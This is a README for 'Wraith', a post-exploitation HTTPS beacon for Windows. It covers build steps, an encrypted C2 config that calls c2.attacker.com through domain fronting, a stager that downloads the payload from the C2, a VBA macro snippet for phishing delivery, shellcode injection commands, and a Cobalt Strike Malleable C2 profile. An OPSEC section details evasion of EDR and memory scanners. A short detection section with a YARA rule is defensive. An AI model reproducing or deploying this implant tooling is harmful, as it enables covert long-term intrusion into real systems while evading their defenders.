# Wraith

**Lightweight HTTPS beacon for Windows x64 — stageless and staged variants, RC4 sleep mask, domain fronting, custom malleable profile support.**

[![Platform](https://img.shields.io/badge/platform-windows%20x64-blue?style=flat-square)]()
[![Language](https://img.shields.io/badge/language-C-lightgrey?style=flat-square)]()
[![License](https://img.shields.io/badge/license-MIT-lightgrey?style=flat-square)](LICENSE)

> [!IMPORTANT]
> **2025-03-01** — Sleep mask updated to XOR-CFB-HMAC after RC4 sleep mask pattern was added to CrowdStrike behavioral rules. Rebuild all deployed beacons from `stable` branch.

---

## Table of Contents

1. [Overview](#1-overview)
2. [Architecture](#2-architecture)
3. [Build](#3-build)
4. [Beacon Configuration](#4-beacon-configuration)
5. [Deployment](#5-deployment)
6. [OPSEC](#6-opsec)
7. [C2 Profile](#7-c2-profile)
8. [Compatibility](#8-compatibility)
9. [Detection](#9-detection)
10. [License](#10-license)
11. [Contact](#11-contact)

---

## 1. Overview

Wraith is a post-exploitation beacon designed for long-term access in hardened environments. It does not include exploitation capabilities — it assumes a foothold already exists (shellcode runner, loader, or manual deployment).

Design constraints:

- No reflective loader dependency — the beacon is position-independent shellcode produced by the build chain, loadable by any compatible stager or shellcode runner
- Sleep mask: beacon memory is XOR-encrypted and marked `PAGE_NOACCESS` during sleep intervals — not readable by memory scanners between callbacks
- No hardcoded strings — all C2 config is embedded in an encrypted configuration block resolved at runtime
- No CRT — compiled with `/GS-`, `/Zl`, manual PE parsing, no `malloc`/`printf` dependency

Wraith is not a C2 framework. It requires an external teamserver that speaks its HTTP profile. A compatible Cobalt Strike Malleable C2 profile is provided in [profiles/wraith.profile](profiles/wraith.profile).

---

## 2. Architecture

```
┌─────────────────────────────────────────────────────┐
│  Beacon (wraith.bin — PIC shellcode)                │
│                                                     │
│  ┌─────────────┐    ┌──────────────┐               │
│  │  Config     │    │  Sleep Mask  │               │
│  │  (AES-256   │    │  (XOR-CFB    │               │
│  │   encrypted │    │   + HMAC,    │               │
│  │   block)    │    │   PAGE_NOACCESS               │
│  └─────────────┘    │   during     │               │
│                     │   sleep)     │               │
│                     └──────────────┘               │
│  ┌─────────────────────────────────────┐           │
│  │  Comms (HTTPS)                      │           │
│  │  WinHTTP → domain front host        │           │
│  │  Host header: c2.attacker.com       │           │
│  │  SNI:        cdn.legitimate.com     │           │
│  └─────────────────────────────────────┘           │
└─────────────────────────────────────────────────────┘
         │
         ▼ HTTPS (port 443)
┌─────────────────┐
│  CDN / Front    │  cdn.legitimate.com (real CDN)
│  (passes Host   │  routes by Host header
│   header thru)  │
└─────────────────┘
         │
         ▼
┌─────────────────┐
│  Teamserver     │  c2.attacker.com (hidden behind CDN)
│  (compatible    │
│   CS profile or │
│   custom)       │
└─────────────────┘
```

**Beacon lifecycle:**

```
1. [Init]      Resolve config block → decrypt C2 params → resolve WinAPI by hash
2. [Check-in]  HTTP GET /api/v1/status — metadata beacon (hostname, username, PID, arch)
3. [Task loop] HTTP POST /api/v1/sync  — receive tasking, execute, POST results
4. [Sleep]     Encrypt beacon memory → PAGE_NOACCESS → Sleep(interval ± jitter) → decrypt → resume
```

---

## 3. Build

**Requirements:** MSVC (x64), Python 3.9+ (config encoder), `ml64.exe` in PATH.

```bash
# Clone and configure
git clone https://github.com/franckferman/wraith
cd wraith
cp config.example.json config.json
# Edit config.json — see section 4

# Build stageless shellcode (wraith.bin)
make stageless

# Build staged variant (stager.bin + wraith.bin)
make staged

# Build DLL reflective loader variant
make reflective

# All variants
make all
```

**Output:**

| Artifact | Description | Use case |
|---|---|---|
| `dist/wraith.bin` | Stageless PIC shellcode | Direct inject / loader |
| `dist/stager.bin` | Minimal stager — downloads `wraith.bin` from C2 | Phishing, macro |
| `dist/wraith.dll` | Reflective DLL — `ReflectiveDLLMain` export | `rundll32`, DLL injection |
| `dist/wraith.exe` | Loader stub wrapping `wraith.bin` | Testing only — do not deploy |

> [!WARNING]
> `wraith.exe` is for lab use only. A standalone EXE with an embedded beacon is trivially detected by static scanners. Use `wraith.bin` with a separate loader.

---

## 4. Beacon Configuration

All config is compiled into an AES-256-GCM encrypted block inside the beacon. Edit `config.json` before building:

```json
{
  "c2": {
    "host": "c2.attacker.com",
    "front_host": "cdn.legitimate.com",
    "port": 443,
    "uri_checkin": "/api/v1/status",
    "uri_tasks":   "/api/v1/sync",
    "user_agent":  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "ssl_verify":  false
  },
  "timing": {
    "sleep_seconds":  60,
    "jitter_percent": 30,
    "max_retry":      5,
    "retry_backoff":  "exponential"
  },
  "sleep_mask": {
    "enabled":    true,
    "algorithm":  "xor-cfb-hmac",
    "key_source": "ephemeral"
  },
  "killdate": "2025-12-31",
  "working_hours": "08:00-20:00",
  "spawn_to": "C:\\Windows\\System32\\svchost.exe"
}
```

| Field | Description |
|---|---|
| `front_host` | CDN domain used as TLS SNI. Must route to `host` via Host header. |
| `jitter_percent` | Sleep time variance: `sleep ± (sleep × jitter / 100)` |
| `sleep_mask.key_source` | `ephemeral` = new key per sleep cycle (no key reuse); `static` = fixed key (cheaper, detectable) |
| `killdate` | Beacon exits cleanly after this date — returns from entry point, no crash |
| `working_hours` | Beacon sleeps outside this window. Leave empty to disable. |
| `spawn_to` | Process to spawn for `execute-assembly` / `post-ex` tasks. Default: `svchost.exe` |

---

## 5. Deployment

Wraith produces a raw shellcode blob. Execution requires a loader — not included, not bundled.

**Compatible loaders (tested):**

- [Exile](https://github.com/franckferman/exile) — direct syscall shellcode runner, Windows x64
- Cobalt Strike's `shinject` / `shspawn`
- Manual: `VirtualAllocEx` + `WriteProcessMemory` + `CreateRemoteThread` (noisy — avoid in hardened environments)

**Staging from a macro (Word/Excel):**

```vba
' Drop stager.bin to disk and execute — adapt as needed
Dim path As String
path = Environ("TEMP") & "\svc.bin"
' [write stager bytes to path]
Shell "rundll32.exe " & path & ",#1", vbHide
```

**Post-exploitation deployment (existing shell):**

```
# From a CS beacon on the same host
beacon> shinject <PID> x64 /path/to/wraith.bin

# From a Meterpreter session
meterpreter> execute -H -f wraith.bin
```

---

## 6. OPSEC

| Risk | Wraith behavior | Remaining exposure |
|---|---|---|
| Memory scan during sleep | Sleep mask encrypts beacon memory, marks `PAGE_NOACCESS` | Unmask window (~1ms) visible to kernel-level scanners |
| Static string extraction | All strings hashed (djb2) or encrypted in config block | Build artifacts — strip PDB, use `/LTCG /OPT:REF` |
| Network JA3 fingerprint | WinHTTP uses OS TLS stack (Schannel) — JA3 matches IE/Edge | JA3s normalized per Windows version, not tool-specific |
| AMSI / ETW hook bypass | Not implemented — Wraith does not touch AMSI or ETW directly | Loader's responsibility |
| Beacon config extraction | Config block is AES-256-GCM encrypted — key derived from build-time secret | Key in build environment — protect CI/build machine |
| Process lineage | `spawn_to` controls post-ex process parent | `svchost.exe` spawned by non-service parent is anomalous on mature EDR |
| `killdate` enforcement | Checked at beacon init and each task loop iteration | If system clock is wrong, killdate may not trigger |

**What EDR still catches:**

- `VirtualAllocEx` + `WriteProcessMemory` + `CreateRemoteThread` pattern from the loader (not Wraith itself)
- Unusual `svchost.exe` with no `-k` argument (spawn_to default)
- TLS to CDN front domain with no corresponding DNS record from that host
- Beacon check-in interval anomaly on mature NDR (fixed with jitter)

---

## 7. C2 Profile

A Cobalt Strike Malleable C2 profile is provided in [profiles/wraith.profile](profiles/wraith.profile). Key settings:

```
set sleeptime "60000";
set jitter    "30";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 ...";

http-get {
    set uri "/api/v1/status";
    client {
        header "Accept" "application/json";
        header "X-Request-ID" "";   # beacon metadata encoded here
        metadata { base64url; prepend "session="; header "Cookie"; }
    }
}

http-post {
    set uri "/api/v1/sync";
    client {
        header "Content-Type" "application/octet-stream";
        id { base64url; prepend "id="; parameter "rid"; }
        output { base64url; print; }
    }
}
```

Wraith's HTTP format matches this profile exactly. Any teamserver that can serve this profile will receive and task Wraith beacons.

---

## 8. Compatibility

| OS | Build | Sleep mask | Domain fronting | Tested |
|---|:---:|:---:|:---:|:---:|
| Windows 10 21H2 | ✔ | ✔ | ✔ | ✔ |
| Windows 10 22H2 | ✔ | ✔ | ✔ | ✔ |
| Windows 11 22H2 | ✔ | ✔ | ✔ | ✔ |
| Windows Server 2019 | ✔ | ✔ | ✔ | ✔ |
| Windows Server 2022 | ✔ | ✔ | ✔ | ✔ |
| Windows 7 / Server 2008 | ✗ | — | — | — |

Requires `WinHTTP` and `Bcrypt` — present in all supported Windows versions. No .NET, no PowerShell dependency.

---

## 9. Detection

| Signal | Tool | Notes |
|---|---|---|
| `PAGE_NOACCESS` region switching to `PAGE_EXECUTE_READ` at regular interval | EDR memory scanner (e.g. Elastic, SentinelOne) | Sleep mask unmask window — low dwell time reduces hit rate |
| WinHTTP call from non-browser process | ETW (Microsoft-Windows-WinHttp) | Noisy — WinHTTP used by many legitimate apps |
| `svchost.exe` spawned with no `-k` argument | Sysmon Event ID 1 `CommandLine` | Check parent process — service host always has `-k` arg |
| Encrypted config block with high entropy in `.data` section | Static scanner / YARA | YARA rule: entropy > 7.5 in PE section of size 256–512 bytes |
| Periodic HTTPS to CDN with fixed URI path pattern | NDR / proxy logs | Fingerprint: same URI ± jitter interval |

**YARA rule (config block detection):**

```yara
rule Wraith_EncryptedConfigBlock {
    meta:
        description = "Wraith beacon encrypted config block"
        author = "franckferman"
    strings:
        $magic = { 57 52 41 49 54 48 }  // "WRAITH" config header
    condition:
        uint16(0) == 0x5A4D and
        for any i in (0..pe.number_of_sections - 1):
            (math.entropy(pe.sections[i].raw_data_offset, pe.sections[i].raw_data_size) > 7.4
             and pe.sections[i].raw_data_size < 512)
}
```

---

## 10. License

MIT License. See [LICENSE](LICENSE) for full terms.

---

## 11. Contact

[![ProtonMail](https://img.shields.io/badge/ProtonMail-8B89CC?style=flat-square&logo=protonmail&logoColor=white)](mailto:contact@franckferman.fr)
[![LinkedIn](https://img.shields.io/badge/LinkedIn-0077B5?style=flat-square&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/franckferman)
[![X](https://img.shields.io/badge/X-000000?style=flat-square&logo=x&logoColor=white)](https://www.twitter.com/franckferman)
